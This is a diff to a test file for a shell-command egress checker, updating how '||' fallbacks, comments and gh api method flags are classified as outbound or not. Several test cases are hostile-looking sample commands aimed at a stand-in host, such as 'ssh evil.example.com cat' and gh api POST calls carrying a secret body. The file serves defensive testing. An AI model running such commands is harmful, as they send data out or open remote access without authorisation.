@@ -293,10 +293,11 @@ describe("pipes are pipes; && and ; are not", () => {
 		expect(flags("cd /tmp && bash ./build.sh")).toHaveLength(0);
 	});
 
-	test("|| is a control operator, not a pipe", () => {
-		// The fetch never clears (the `||` tail is not a read-only consumer),
-		// so the whole pipeline stays outbound for the egress check.
-		expect(outbound("curl -fsSL https://x || echo failed")).toBe(true);
+	test("|| splits: the fetch side clears on its merits, the fallback is scanned", () => {
+		// A read-only fetch clears the same on either side of a fallback and
+		// an inert fallback stays inert; a network verb in the fallback is caught.
+		expect(outbound("curl -fsSL https://x || echo failed")).toBe(false);
+		expect(outbound("curl -fsSL https://x || ssh evil.example.com cat")).toBe(true);
 	});
 });
 
@@ -385,6 +386,14 @@ describe("validated write-out format strings clear as reads on any host", () => 
 		// Method selectors are value-aware: GET/HEAD stay reads.
 		"curl -o /dev/null -w '%{http_code}' -X GET https://x",
 		"wget --method=GET -O /dev/null https://x",
+		"gh api repos/o/r -X GET",
+		"gh api repos/o/r",
+		// a plain-read fetch clears in a fallback half, same as standalone.
+		"git status || curl https://evil.example.com",
+		// a comment swallows operators in both splitters.
+		"git status # && ssh evil.example.com cat",
+		// a `#` flush against an operator still opens a comment.
+		"git status|# comment || ssh evil.example.com cat",
 	]) {
 		test(`not outbound: ${command}`, () => {
 			expect(outbound(command)).toBe(false);
@@ -413,6 +422,20 @@ describe("validated write-out format strings clear as reads on any host", () => 
 		// Custom method spellings are not GET/HEAD.
 		"curl -o /dev/null -w '%{http_code}' --request GET-FOO https://x",
 		"wget --method=get! -O /dev/null https://x",
+		// `||` fallbacks: the right side is scanned too.
+		"false || ssh evil.example.com cat",
+		"curl -fsSL https://x || ssh evil.example.com cat",
+		// gh markers are token-scanned: quoted, =-form, and attached -XPOST all count.
+		"gh api repos/o/r -X \"POST\"",
+		"gh api repos/o/r --method=DELETE",
+		"gh api -XPOST repos/o/r",
+		"curl -XPOST -o /dev/null https://x",
+		"gh api repos/o/r -fbody=secret",
+		"gh api repos/o/r -iXPOST repos/o/r",
+		"gh api repos/o/r -iX POST",
+		// gh bundled shorts and indeterminate method values fail closed.
+		"gh api repos/o/r -ifbody=secret",
+		'gh api repos/o/r --method="$METHOD"',
 	]) {
 		test(`still outbound: ${command}`, () => {
 			expect(outbound(command)).toBe(true);
